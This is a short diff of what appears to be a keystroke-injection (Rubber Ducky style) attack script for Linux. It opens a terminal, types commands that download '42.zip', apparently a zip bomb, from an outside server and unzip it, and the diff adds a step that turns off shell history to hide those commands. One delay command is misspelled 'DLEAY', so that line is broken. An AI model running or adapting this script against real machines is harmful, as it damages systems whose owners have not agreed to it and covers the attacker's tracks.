@@ -3,8 +3,11 @@ REM Target linux
 DELAY 300
 CTRL-ALT t
 DELAY 1500
+STRING set +o history
+DELAY 300
+ENTER
 STRING wget https://www.lostserver.com/static/42.zip
-DLEAY 300
+DLEAY 5000
 ENTER
 STRING unzip 42.zip
 DELAY 300
